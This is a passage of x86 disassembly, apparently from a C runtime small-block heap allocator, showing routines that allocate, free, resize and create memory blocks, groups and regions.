  426974:	jne    0x426997
  426976:	mov    ecx,DWORD PTR [ebp+0x8]
  426979:	and    DWORD PTR [ecx],esi
  42697b:	jmp    0x426997
  42697d:	lea    ecx,[ebx-0x20]
  426980:	shr    esi,cl
  426982:	not    esi
  426984:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42698b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42698f:	jne    0x426997
  426991:	mov    ecx,DWORD PTR [ebp+0x8]
  426994:	and    DWORD PTR [ecx+0x4],esi
  426997:	mov    ecx,DWORD PTR [ebp+0xc]
  42699a:	mov    esi,DWORD PTR [ecx+0x8]
  42699d:	mov    ecx,DWORD PTR [ecx+0x4]
  4269a0:	mov    DWORD PTR [esi+0x4],ecx
  4269a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4269a6:	mov    esi,DWORD PTR [ecx+0x4]
  4269a9:	mov    ecx,DWORD PTR [ecx+0x8]
  4269ac:	mov    DWORD PTR [esi+0x8],ecx
  4269af:	mov    esi,DWORD PTR [ebp+0xc]
  4269b2:	jmp    0x4269b7
  4269b4:	mov    ebx,DWORD PTR [ebp+0x8]
  4269b7:	cmp    DWORD PTR [ebp-0xc],0x0
  4269bb:	jne    0x4269c5
  4269bd:	cmp    ebx,edx
  4269bf:	je     0x426a45
  4269c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4269c8:	lea    ecx,[ecx+edx*8]
  4269cb:	mov    ebx,DWORD PTR [ecx+0x4]
  4269ce:	mov    DWORD PTR [esi+0x8],ecx
  4269d1:	mov    DWORD PTR [esi+0x4],ebx
  4269d4:	mov    DWORD PTR [ecx+0x4],esi
  4269d7:	mov    ecx,DWORD PTR [esi+0x4]
  4269da:	mov    DWORD PTR [ecx+0x8],esi
  4269dd:	mov    ecx,DWORD PTR [esi+0x4]
  4269e0:	cmp    ecx,DWORD PTR [esi+0x8]
  4269e3:	jne    0x426a45
  4269e5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4269e9:	mov    BYTE PTR [ebp+0xf],cl
  4269ec:	inc    cl
  4269ee:	cmp    edx,0x20
  4269f1:	mov    BYTE PTR [edx+eax*1+0x4],cl
  4269f5:	jae    0x426a1c
  4269f7:	cmp    BYTE PTR [ebp+0xf],0x0
  4269fb:	jne    0x426a0b
  4269fd:	mov    ecx,edx
  4269ff:	mov    ebx,0x80000000
  426a04:	shr    ebx,cl
  426a06:	mov    ecx,DWORD PTR [ebp+0x8]
  426a09:	or     DWORD PTR [ecx],ebx
  426a0b:	mov    ebx,0x80000000
  426a10:	mov    ecx,edx
  426a12:	shr    ebx,cl
  426a14:	lea    eax,[eax+edi*4+0x44]
  426a18:	or     DWORD PTR [eax],ebx
  426a1a:	jmp    0x426a45
  426a1c:	cmp    BYTE PTR [ebp+0xf],0x0
  426a20:	jne    0x426a32
  426a22:	lea    ecx,[edx-0x20]
  426a25:	mov    ebx,0x80000000
  426a2a:	shr    ebx,cl
  426a2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426a2f:	or     DWORD PTR [ecx+0x4],ebx
  426a32:	lea    ecx,[edx-0x20]
  426a35:	mov    edx,0x80000000
  426a3a:	shr    edx,cl
  426a3c:	lea    eax,[eax+edi*4+0xc4]
  426a43:	or     DWORD PTR [eax],edx
  426a45:	mov    eax,DWORD PTR [ebp-0x4]
  426a48:	mov    DWORD PTR [esi],eax
  426a4a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  426a4e:	mov    eax,DWORD PTR [ebp-0x10]
  426a51:	dec    DWORD PTR [eax]
  426a53:	jne    0x426b50
  426a59:	mov    eax,ds:0x4639f8
  426a5e:	test   eax,eax
  426a60:	je     0x426b42
  426a66:	mov    ecx,DWORD PTR ds:0x463a10
  426a6c:	mov    esi,DWORD PTR ds:0x4290ec
  426a72:	push   0x4000
  426a77:	shl    ecx,0xf
  426a7a:	add    ecx,DWORD PTR [eax+0xc]
  426a7d:	mov    ebx,0x8000
  426a82:	push   ebx
  426a83:	push   ecx
  426a84:	call   esi
  426a86:	mov    ecx,DWORD PTR ds:0x463a10
  426a8c:	mov    eax,ds:0x4639f8
  426a91:	mov    edx,0x80000000
  426a96:	shr    edx,cl
  426a98:	or     DWORD PTR [eax+0x8],edx
  426a9b:	mov    eax,ds:0x4639f8
  426aa0:	mov    eax,DWORD PTR [eax+0x10]
  426aa3:	mov    ecx,DWORD PTR ds:0x463a10
  426aa9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  426ab1:	mov    eax,ds:0x4639f8
  426ab6:	mov    eax,DWORD PTR [eax+0x10]
  426ab9:	dec    BYTE PTR [eax+0x43]
  426abc:	mov    eax,ds:0x4639f8
  426ac1:	mov    ecx,DWORD PTR [eax+0x10]
  426ac4:	cmp    BYTE PTR [ecx+0x43],0x0
  426ac8:	jne    0x426ad3
  426aca:	and    DWORD PTR [eax+0x4],0xfffffffe
  426ace:	mov    eax,ds:0x4639f8
  426ad3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  426ad7:	jne    0x426b42
  426ad9:	push   ebx
  426ada:	push   0x0
  426adc:	push   DWORD PTR [eax+0xc]
  426adf:	call   esi
  426ae1:	mov    eax,ds:0x4639f8
  426ae6:	push   DWORD PTR [eax+0x10]
  426ae9:	push   0x0
  426aeb:	push   DWORD PTR ds:0x463c40
  426af1:	call   DWORD PTR ds:0x429034
  426af7:	mov    eax,ds:0x4639fc
  426afc:	mov    edx,DWORD PTR ds:0x463a00
  426b02:	lea    eax,[eax+eax*4]
  426b05:	shl    eax,0x2
  426b08:	mov    ecx,eax
  426b0a:	mov    eax,ds:0x4639f8
  426b0f:	sub    ecx,eax
  426b11:	lea    ecx,[ecx+edx*1-0x14]
  426b15:	push   ecx
  426b16:	lea    ecx,[eax+0x14]
  426b19:	push   ecx
  426b1a:	push   eax
  426b1b:	call   0x428370
  426b20:	mov    eax,DWORD PTR [ebp+0x8]
  426b23:	add    esp,0xc
  426b26:	dec    DWORD PTR ds:0x4639fc
  426b2c:	cmp    eax,DWORD PTR ds:0x4639f8
  426b32:	jbe    0x426b38
  426b34:	sub    DWORD PTR [ebp+0x8],0x14
  426b38:	mov    eax,ds:0x463a00
  426b3d:	mov    ds:0x463a08,eax
  426b42:	mov    eax,DWORD PTR [ebp+0x8]
  426b45:	mov    ds:0x4639f8,eax
  426b4a:	mov    DWORD PTR ds:0x463a10,edi
  426b50:	pop    ebx
  426b51:	pop    edi
  426b52:	pop    esi
  426b53:	leave  
  426b54:	ret    
  426b55:	mov    eax,ds:0x4639fc
  426b5a:	mov    ecx,DWORD PTR ds:0x463a0c
  426b60:	push   edi
  426b61:	xor    edi,edi
  426b63:	cmp    eax,ecx
  426b65:	jne    0x426b9b
  426b67:	lea    eax,[ecx+ecx*4+0x50]
  426b6b:	shl    eax,0x2
  426b6e:	push   eax
  426b6f:	push   DWORD PTR ds:0x463a00
  426b75:	push   edi
  426b76:	push   DWORD PTR ds:0x463c40
  426b7c:	call   DWORD PTR ds:0x42910c
  426b82:	cmp    eax,edi
  426b84:	jne    0x426b8a
  426b86:	xor    eax,eax
  426b88:	pop    edi
  426b89:	ret    
  426b8a:	add    DWORD PTR ds:0x463a0c,0x10
  426b91:	mov    ds:0x463a00,eax
  426b96:	mov    eax,ds:0x4639fc
  426b9b:	mov    ecx,DWORD PTR ds:0x463a00
  426ba1:	push   esi
  426ba2:	push   0x41c4
  426ba7:	push   0x8
  426ba9:	push   DWORD PTR ds:0x463c40
  426baf:	lea    eax,[eax+eax*4]
  426bb2:	lea    esi,[ecx+eax*4]
  426bb5:	call   DWORD PTR ds:0x429038
  426bbb:	cmp    eax,edi
  426bbd:	mov    DWORD PTR [esi+0x10],eax
  426bc0:	jne    0x426bc6
  426bc2:	xor    eax,eax
  426bc4:	jmp    0x426c09
  426bc6:	push   0x4
  426bc8:	push   0x2000
  426bcd:	push   0x100000
  426bd2:	push   edi
  426bd3:	call   DWORD PTR ds:0x429058
  426bd9:	cmp    eax,edi
  426bdb:	mov    DWORD PTR [esi+0xc],eax
  426bde:	jne    0x426bf2
  426be0:	push   DWORD PTR [esi+0x10]
  426be3:	push   edi
  426be4:	push   DWORD PTR ds:0x463c40
  426bea:	call   DWORD PTR ds:0x429034
  426bf0:	jmp    0x426bc2
  426bf2:	or     DWORD PTR [esi+0x8],0xffffffff
  426bf6:	mov    DWORD PTR [esi],edi
  426bf8:	mov    DWORD PTR [esi+0x4],edi
  426bfb:	inc    DWORD PTR ds:0x4639fc
  426c01:	mov    eax,DWORD PTR [esi+0x10]
  426c04:	or     DWORD PTR [eax],0xffffffff
  426c07:	mov    eax,esi
  426c09:	pop    esi
  426c0a:	pop    edi
  426c0b:	ret    
  426c0c:	push   ebp
  426c0d:	mov    ebp,esp
  426c0f:	push   ecx
  426c10:	push   ecx
  426c11:	mov    ecx,DWORD PTR [ebp+0x8]
  426c14:	mov    eax,DWORD PTR [ecx+0x8]
  426c17:	push   ebx
  426c18:	push   esi
  426c19:	mov    esi,DWORD PTR [ecx+0x10]
  426c1c:	push   edi
  426c1d:	xor    ebx,ebx
  426c1f:	jmp    0x426c24
  426c21:	shl    eax,1
  426c23:	inc    ebx
  426c24:	test   eax,eax
  426c26:	jge    0x426c21
  426c28:	mov    eax,ebx
  426c2a:	imul   eax,eax,0x204
  426c30:	lea    eax,[eax+esi*1+0x144]
  426c37:	push   0x3f
  426c39:	mov    DWORD PTR [ebp-0x8],eax
  426c3c:	pop    edx
  426c3d:	mov    DWORD PTR [eax+0x8],eax
  426c40:	mov    DWORD PTR [eax+0x4],eax
  426c43:	add    eax,0x8
  426c46:	dec    edx
  426c47:	jne    0x426c3d
  426c49:	push   0x4
  426c4b:	mov    edi,ebx
  426c4d:	push   0x1000
  426c52:	shl    edi,0xf
  426c55:	add    edi,DWORD PTR [ecx+0xc]
  426c58:	push   0x8000
  426c5d:	push   edi
  426c5e:	call   DWORD PTR ds:0x429058
  426c64:	test   eax,eax
  426c66:	jne    0x426c70
  426c68:	or     eax,0xffffffff
  426c6b:	jmp    0x426d0d
  426c70:	lea    edx,[edi+0x7000]
  426c76:	cmp    edi,edx
  426c78:	mov    DWORD PTR [ebp-0x4],edx
  426c7b:	ja     0x426cc0
  426c7d:	mov    ecx,edx
  426c7f:	sub    ecx,edi
  426c81:	shr    ecx,0xc
  426c84:	lea    eax,[edi+0x10]
  426c87:	inc    ecx
  426c88:	or     DWORD PTR [eax-0x8],0xffffffff
  426c8c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426c93:	lea    edx,[eax+0xffc]
  426c99:	mov    DWORD PTR [eax],edx
  426c9b:	lea    edx,[eax-0x1004]
  426ca1:	mov    DWORD PTR [eax-0x4],0xff0
  426ca8:	mov    DWORD PTR [eax+0x4],edx
  426cab:	mov    DWORD PTR [eax+0xfe8],0xff0
  426cb5:	add    eax,0x1000
  426cba:	dec    ecx
  426cbb:	jne    0x426c88
  426cbd:	mov    edx,DWORD PTR [ebp-0x4]
  426cc0:	mov    eax,DWORD PTR [ebp-0x8]
  426cc3:	add    eax,0x1f8
  426cc8:	lea    ecx,[edi+0xc]
  426ccb:	mov    DWORD PTR [eax+0x4],ecx
  426cce:	mov    DWORD PTR [ecx+0x8],eax
  426cd1:	lea    ecx,[edx+0xc]
  426cd4:	mov    DWORD PTR [eax+0x8],ecx
  426cd7:	mov    DWORD PTR [ecx+0x4],eax
  426cda:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426cdf:	xor    edi,edi
  426ce1:	inc    edi
  426ce2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426ce9:	mov    al,BYTE PTR [esi+0x43]
  426cec:	mov    cl,al
  426cee:	inc    cl
  426cf0:	test   al,al
  426cf2:	mov    eax,DWORD PTR [ebp+0x8]
  426cf5:	mov    BYTE PTR [esi+0x43],cl
  426cf8:	jne    0x426cfd
  426cfa:	or     DWORD PTR [eax+0x4],edi
  426cfd:	mov    edx,0x80000000
  426d02:	mov    ecx,ebx
  426d04:	shr    edx,cl
  426d06:	not    edx
  426d08:	and    DWORD PTR [eax+0x8],edx
  426d0b:	mov    eax,ebx
  426d0d:	pop    edi
  426d0e:	pop    esi
  426d0f:	pop    ebx
  426d10:	leave  
  426d11:	ret    
  426d12:	push   ebp
  426d13:	mov    ebp,esp
  426d15:	sub    esp,0xc
  426d18:	mov    ecx,DWORD PTR [ebp+0x8]
  426d1b:	mov    eax,DWORD PTR [ecx+0x10]
  426d1e:	push   ebx
  426d1f:	push   esi
  426d20:	mov    esi,DWORD PTR [ebp+0x10]
  426d23:	push   edi
  426d24:	mov    edi,DWORD PTR [ebp+0xc]
  426d27:	mov    edx,edi
  426d29:	sub    edx,DWORD PTR [ecx+0xc]
  426d2c:	add    esi,0x17
  426d2f:	shr    edx,0xf
  426d32:	mov    ecx,edx
  426d34:	imul   ecx,ecx,0x204
  426d3a:	lea    ecx,[ecx+eax*1+0x144]
  426d41:	mov    DWORD PTR [ebp-0xc],ecx
  426d44:	mov    ecx,DWORD PTR [edi-0x4]
  426d47:	and    esi,0xfffffff0
  426d4a:	dec    ecx
  426d4b:	cmp    esi,ecx
  426d4d:	lea    edi,[ecx+edi*1-0x4]
  426d51:	mov    ebx,DWORD PTR [edi]
  426d53:	mov    DWORD PTR [ebp+0x10],ecx
  426d56:	mov    DWORD PTR [ebp-0x4],ebx
  426d59:	jle    0x426eb4
  426d5f:	test   bl,0x1
  426d62:	jne    0x426ead
  426d68:	add    ebx,ecx
  426d6a:	cmp    esi,ebx
  426d6c:	jg     0x426ead
  426d72:	mov    ecx,DWORD PTR [ebp-0x4]
  426d75:	sar    ecx,0x4
  426d78:	dec    ecx
  426d79:	cmp    ecx,0x3f
  426d7c:	mov    DWORD PTR [ebp-0x8],ecx
  426d7f:	jbe    0x426d87
  426d81:	push   0x3f
  426d83:	pop    ecx
  426d84:	mov    DWORD PTR [ebp-0x8],ecx
  426d87:	mov    ebx,DWORD PTR [edi+0x4]
  426d8a:	cmp    ebx,DWORD PTR [edi+0x8]
  426d8d:	jne    0x426dd2
  426d8f:	cmp    ecx,0x20
  426d92:	mov    ebx,0x80000000
  426d97:	jae    0x426db3
  426d99:	shr    ebx,cl
  426d9b:	mov    ecx,DWORD PTR [ebp-0x8]
  426d9e:	lea    ecx,[ecx+eax*1+0x4]
  426da2:	not    ebx
  426da4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426da8:	dec    BYTE PTR [ecx]
  426daa:	jne    0x426dd2
  426dac:	mov    ecx,DWORD PTR [ebp+0x8]
  426daf:	and    DWORD PTR [ecx],ebx
  426db1:	jmp    0x426dd2
  426db3:	add    ecx,0xffffffe0
  426db6:	shr    ebx,cl
  426db8:	mov    ecx,DWORD PTR [ebp-0x8]
  426dbb:	lea    ecx,[ecx+eax*1+0x4]
  426dbf:	not    ebx
  426dc1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426dc8:	dec    BYTE PTR [ecx]
  426dca:	jne    0x426dd2
  426dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  426dcf:	and    DWORD PTR [ecx+0x4],ebx
  426dd2:	mov    ecx,DWORD PTR [edi+0x8]
  426dd5:	mov    ebx,DWORD PTR [edi+0x4]
  426dd8:	mov    DWORD PTR [ecx+0x4],ebx
  426ddb:	mov    ecx,DWORD PTR [edi+0x4]
  426dde:	mov    edi,DWORD PTR [edi+0x8]
  426de1:	mov    DWORD PTR [ecx+0x8],edi
  426de4:	mov    ecx,DWORD PTR [ebp+0x10]
  426de7:	sub    ecx,esi
  426de9:	add    DWORD PTR [ebp-0x4],ecx
  426dec:	cmp    DWORD PTR [ebp-0x4],0x0
  426df0:	jle    0x426e9b
  426df6:	mov    edi,DWORD PTR [ebp-0x4]
  426df9:	mov    ecx,DWORD PTR [ebp+0xc]
  426dfc:	sar    edi,0x4
  426dff:	dec    edi
  426e00:	cmp    edi,0x3f
  426e03:	lea    ecx,[ecx+esi*1-0x4]
  426e07:	jbe    0x426e0c
  426e09:	push   0x3f
  426e0b:	pop    edi
  426e0c:	mov    ebx,DWORD PTR [ebp-0xc]
  426e0f:	lea    ebx,[ebx+edi*8]
  426e12:	mov    DWORD PTR [ebp+0x10],ebx
  426e15:	mov    ebx,DWORD PTR [ebx+0x4]
  426e18:	mov    DWORD PTR [ecx+0x4],ebx
  426e1b:	mov    ebx,DWORD PTR [ebp+0x10]
  426e1e:	mov    DWORD PTR [ecx+0x8],ebx
  426e21:	mov    DWORD PTR [ebx+0x4],ecx
  426e24:	mov    ebx,DWORD PTR [ecx+0x4]
  426e27:	mov    DWORD PTR [ebx+0x8],ecx
  426e2a:	mov    ebx,DWORD PTR [ecx+0x4]
  426e2d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426e30:	jne    0x426e89
  426e32:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426e36:	mov    BYTE PTR [ebp+0x13],cl
  426e39:	inc    cl
  426e3b:	cmp    edi,0x20
  426e3e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426e42:	jae    0x426e60
  426e44:	cmp    BYTE PTR [ebp+0x13],0x0
  426e48:	jne    0x426e58
  426e4a:	mov    ecx,edi
  426e4c:	mov    ebx,0x80000000
  426e51:	shr    ebx,cl
  426e53:	mov    ecx,DWORD PTR [ebp+0x8]
  426e56:	or     DWORD PTR [ecx],ebx
  426e58:	lea    eax,[eax+edx*4+0x44]
  426e5c:	mov    ecx,edi
  426e5e:	jmp    0x426e80
  426e60:	cmp    BYTE PTR [ebp+0x13],0x0
  426e64:	jne    0x426e76
  426e66:	lea    ecx,[edi-0x20]
  426e69:	mov    ebx,0x80000000
  426e6e:	shr    ebx,cl
  426e70:	mov    ecx,DWORD PTR [ebp+0x8]
  426e73:	or     DWORD PTR [ecx+0x4],ebx
  426e76:	lea    eax,[eax+edx*4+0xc4]
  426e7d:	lea    ecx,[edi-0x20]
  426e80:	mov    edx,0x80000000
  426e85:	shr    edx,cl
  426e87:	or     DWORD PTR [eax],edx
  426e89:	mov    edx,DWORD PTR [ebp+0xc]
  426e8c:	mov    ecx,DWORD PTR [ebp-0x4]
  426e8f:	lea    eax,[edx+esi*1-0x4]
  426e93:	mov    DWORD PTR [eax],ecx
  426e95:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426e99:	jmp    0x426e9e
  426e9b:	mov    edx,DWORD PTR [ebp+0xc]
  426e9e:	lea    eax,[esi+0x1]
  426ea1:	mov    DWORD PTR [edx-0x4],eax
  426ea4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426ea8:	jmp    0x426fe9
  426ead:	xor    eax,eax
  426eaf:	jmp    0x426fec
  426eb4:	jge    0x426fe9
  426eba:	mov    ebx,DWORD PTR [ebp+0xc]
  426ebd:	sub    DWORD PTR [ebp+0x10],esi
  426ec0:	lea    ecx,[esi+0x1]
  426ec3:	mov    DWORD PTR [ebx-0x4],ecx
  426ec6:	lea    ebx,[ebx+esi*1-0x4]
  426eca:	mov    esi,DWORD PTR [ebp+0x10]
  426ecd:	sar    esi,0x4
  426ed0:	dec    esi
  426ed1:	cmp    esi,0x3f
  426ed4:	mov    DWORD PTR [ebp+0xc],ebx
  426ed7:	mov    DWORD PTR [ebx-0x4],ecx
  426eda:	jbe    0x426edf
  426edc:	push   0x3f
  426ede:	pop    esi
  426edf:	test   BYTE PTR [ebp-0x4],0x1
  426ee3:	jne    0x426f69
  426ee9:	mov    esi,DWORD PTR [ebp-0x4]
  426eec:	sar    esi,0x4
  426eef:	dec    esi
  426ef0:	cmp    esi,0x3f
  426ef3:	jbe    0x426ef8
  426ef5:	push   0x3f
  426ef7:	pop    esi
  426ef8:	mov    ecx,DWORD PTR [edi+0x4]
  426efb:	cmp    ecx,DWORD PTR [edi+0x8]
  426efe:	jne    0x426f42
  426f00:	cmp    esi,0x20
  426f03:	mov    ebx,0x80000000
  426f08:	jae    0x426f23
  426f0a:	mov    ecx,esi
  426f0c:	shr    ebx,cl
  426f0e:	lea    esi,[esi+eax*1+0x4]
  426f12:	not    ebx
  426f14:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426f18:	dec    BYTE PTR [esi]
  426f1a:	jne    0x426f3f
  426f1c:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1f:	and    DWORD PTR [ecx],ebx
  426f21:	jmp    0x426f3f
  426f23:	lea    ecx,[esi-0x20]
  426f26:	shr    ebx,cl
  426f28:	lea    ecx,[esi+eax*1+0x4]
  426f2c:	not    ebx
  426f2e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426f35:	dec    BYTE PTR [ecx]
  426f37:	jne    0x426f3f
  426f39:	mov    ecx,DWORD PTR [ebp+0x8]
  426f3c:	and    DWORD PTR [ecx+0x4],ebx
  426f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  426f42:	mov    ecx,DWORD PTR [edi+0x8]
  426f45:	mov    esi,DWORD PTR [edi+0x4]
  426f48:	mov    DWORD PTR [ecx+0x4],esi
  426f4b:	mov    esi,DWORD PTR [edi+0x8]
  426f4e:	mov    ecx,DWORD PTR [edi+0x4]
  426f51:	mov    DWORD PTR [ecx+0x8],esi
  426f54:	mov    esi,DWORD PTR [ebp+0x10]
  426f57:	add    esi,DWORD PTR [ebp-0x4]
  426f5a:	mov    DWORD PTR [ebp+0x10],esi
  426f5d:	sar    esi,0x4
  426f60:	dec    esi
  426f61:	cmp    esi,0x3f
  426f64:	jbe    0x426f69
  426f66:	push   0x3f
  426f68:	pop    esi
  426f69:	mov    ecx,DWORD PTR [ebp-0xc]
  426f6c:	lea    ecx,[ecx+esi*8]
  426f6f:	mov    edi,DWORD PTR [ecx+0x4]
  426f72:	mov    DWORD PTR [ebx+0x8],ecx
  426f75:	mov    DWORD PTR [ebx+0x4],edi
  426f78:	mov    DWORD PTR [ecx+0x4],ebx
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    DWORD PTR [ecx+0x8],ebx
  426f81:	mov    ecx,DWORD PTR [ebx+0x4]
  426f84:	cmp    ecx,DWORD PTR [ebx+0x8]
  426f87:	jne    0x426fe0
  426f89:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426f8d:	mov    BYTE PTR [ebp+0xf],cl
  426f90:	inc    cl
  426f92:	cmp    esi,0x20
  426f95:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426f99:	jae    0x426fb7
  426f9b:	cmp    BYTE PTR [ebp+0xf],0x0
  426f9f:	jne    0x426faf
  426fa1:	mov    ecx,esi
  426fa3:	mov    edi,0x80000000
  426fa8:	shr    edi,cl
  426faa:	mov    ecx,DWORD PTR [ebp+0x8]
  426fad:	or     DWORD PTR [ecx],edi
  426faf:	lea    eax,[eax+edx*4+0x44]
  426fb3:	mov    ecx,esi
  426fb5:	jmp    0x426fd7
  426fb7:	cmp    BYTE PTR [ebp+0xf],0x0
  426fbb:	jne    0x426fcd
  426fbd:	lea    ecx,[esi-0x20]
  426fc0:	mov    edi,0x80000000
  426fc5:	shr    edi,cl
  426fc7:	mov    ecx,DWORD PTR [ebp+0x8]
  426fca:	or     DWORD PTR [ecx+0x4],edi
  426fcd:	lea    eax,[eax+edx*4+0xc4]
  426fd4:	lea    ecx,[esi-0x20]
  426fd7:	mov    edx,0x80000000
  426fdc:	shr    edx,cl
  426fde:	or     DWORD PTR [eax],edx
  426fe0:	mov    eax,DWORD PTR [ebp+0x10]
  426fe3:	mov    DWORD PTR [ebx],eax
  426fe5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426fe9:	xor    eax,eax
  426feb:	inc    eax
  426fec:	pop    edi
  426fed:	pop    esi
  426fee:	pop    ebx
  426fef:	leave  
  426ff0:	ret    
  426ff1:	push   ebp
  426ff2:	mov    ebp,esp
  426ff4:	sub    esp,0x14
  426ff7:	mov    ecx,DWORD PTR [ebp+0x8]
  426ffa:	mov    eax,ds:0x4639fc
  426fff:	mov    edx,DWORD PTR ds:0x463a00
  427005:	add    ecx,0x17
  427008:	and    ecx,0xfffffff0
  42700b:	push   ebx
  42700c:	mov    DWORD PTR [ebp-0x10],ecx
  42700f:	sar    ecx,0x4
  427012:	push   esi
  427013:	lea    eax,[eax+eax*4]
  427016:	push   edi
  427017:	dec    ecx
  427018:	cmp    ecx,0x20
  42701b:	lea    edi,[edx+eax*4]
  42701e:	mov    DWORD PTR [ebp-0x4],edi
  427021:	jge    0x42702e
  427023:	or     esi,0xffffffff
  427026:	shr    esi,cl
  427028:	or     DWORD PTR [ebp-0x8],0xffffffff
  42702c:	jmp    0x42703b
  42702e:	add    ecx,0xffffffe0
  427031:	or     eax,0xffffffff
  427034:	xor    esi,esi
  427036:	shr    eax,cl
  427038:	mov    DWORD PTR [ebp-0x8],eax
  42703b:	mov    eax,ds:0x463a08
  427040:	mov    ebx,eax
  427042:	mov    DWORD PTR [ebp-0xc],esi
  427045:	cmp    ebx,edi
  427047:	jmp    0x42705d
  427049:	mov    ecx,DWORD PTR [ebx+0x4]
  42704c:	mov    edi,DWORD PTR [ebx]
  42704e:	and    ecx,DWORD PTR [ebp-0x8]
  427051:	and    edi,esi
  427053:	or     ecx,edi
  427055:	jne    0x427062
  427057:	add    ebx,0x14
  42705a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42705d:	mov    DWORD PTR [ebp+0x8],ebx
  427060:	jb     0x427049
  427062:	cmp    ebx,DWORD PTR [ebp-0x4]
  427065:	jne    0x42708b
  427067:	mov    ebx,edx
  427069:	jmp    0x42707c
  42706b:	mov    ecx,DWORD PTR [ebx+0x4]
  42706e:	mov    edi,DWORD PTR [ebx]
  427070:	and    ecx,DWORD PTR [ebp-0x8]
  427073:	and    edi,esi
  427075:	or     ecx,edi
  427077:	jne    0x427083
  427079:	add    ebx,0x14
  42707c:	cmp    ebx,eax
  42707e:	mov    DWORD PTR [ebp+0x8],ebx
  427081:	jb     0x42706b
  427083:	cmp    ebx,eax
  427085:	je     0x42711f
  42708b:	mov    DWORD PTR ds:0x463a08,ebx
  427091:	mov    eax,DWORD PTR [ebx+0x10]
  427094:	mov    edx,DWORD PTR [eax]
  427096:	cmp    edx,0xffffffff
  427099:	mov    DWORD PTR [ebp-0x4],edx
  42709c:	je     0x4270b2
  42709e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4270a5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4270a9:	and    ecx,DWORD PTR [ebp-0x8]
  4270ac:	and    edi,esi
  4270ae:	or     ecx,edi
  4270b0:	jne    0x4270e8
  4270b2:	mov    edx,DWORD PTR [eax+0xc4]
  4270b8:	and    edx,DWORD PTR [ebp-0x8]
  4270bb:	and    DWORD PTR [ebp-0x4],0x0
  4270bf:	lea    ecx,[eax+0x44]
  4270c2:	mov    esi,DWORD PTR [ecx]
  4270c4:	and    esi,DWORD PTR [ebp-0xc]
  4270c7:	or     edx,esi
  4270c9:	mov    esi,DWORD PTR [ebp-0xc]
  4270cc:	jne    0x4270e5
  4270ce:	mov    edx,DWORD PTR [ecx+0x84]
  4270d4:	and    edx,DWORD PTR [ebp-0x8]
  4270d7:	inc    DWORD PTR [ebp-0x4]
  4270da:	add    ecx,0x4
  4270dd:	mov    edi,DWORD PTR [ecx]
  4270df:	and    edi,esi
  4270e1:	or     edx,edi
  4270e3:	je     0x4270ce
  4270e5:	mov    edx,DWORD PTR [ebp-0x4]
  4270e8:	mov    ecx,edx
  4270ea:	imul   ecx,ecx,0x204
  4270f0:	lea    ecx,[ecx+eax*1+0x144]
  4270f7:	mov    DWORD PTR [ebp-0xc],ecx
  4270fa:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  4270fe:	xor    edi,edi
  427100:	and    ecx,esi
  427102:	jne    0x427171
  427104:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42710b:	and    ecx,DWORD PTR [ebp-0x8]
  42710e:	push   0x20
  427110:	pop    edi
  427111:	jmp    0x427171
  427113:	cmp    DWORD PTR [ebx+0x8],0x0
  427117:	jne    0x427124
  427119:	add    ebx,0x14
  42711c:	mov    DWORD PTR [ebp+0x8],ebx
  42711f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427122:	jb     0x427113
  427124:	cmp    ebx,DWORD PTR [ebp-0x4]
  427127:	jne    0x42714f
  427129:	mov    ebx,edx
  42712b:	jmp    0x427136
  42712d:	cmp    DWORD PTR [ebx+0x8],0x0
  427131:	jne    0x42713d
  427133:	add    ebx,0x14
  427136:	cmp    ebx,eax
  427138:	mov    DWORD PTR [ebp+0x8],ebx
  42713b:	jb     0x42712d
  42713d:	cmp    ebx,eax
  42713f:	jne    0x42714f
  427141:	call   0x426b55
  427146:	mov    ebx,eax
  427148:	test   ebx,ebx
  42714a:	mov    DWORD PTR [ebp+0x8],ebx
  42714d:	je     0x427167
  42714f:	push   ebx
  427150:	call   0x426c0c
  427155:	pop    ecx
  427156:	mov    ecx,DWORD PTR [ebx+0x10]
  427159:	mov    DWORD PTR [ecx],eax
  42715b:	mov    eax,DWORD PTR [ebx+0x10]
  42715e:	cmp    DWORD PTR [eax],0xffffffff
  427161:	jne    0x42708b
  427167:	xor    eax,eax
  427169:	jmp    0x4272e8
  42716e:	shl    ecx,1
  427170:	inc    edi
  427171:	test   ecx,ecx
  427173:	jge    0x42716e
  427175:	mov    ecx,DWORD PTR [ebp-0xc]
  427178:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42717c:	mov    ecx,DWORD PTR [edx]
  42717e:	sub    ecx,DWORD PTR [ebp-0x10]
  427181:	mov    esi,ecx
  427183:	sar    esi,0x4
  427186:	dec    esi
  427187:	cmp    esi,0x3f
  42718a:	mov    DWORD PTR [ebp-0x8],ecx
  42718d:	jle    0x427192
  42718f:	push   0x3f
  427191:	pop    esi
  427192:	cmp    esi,edi
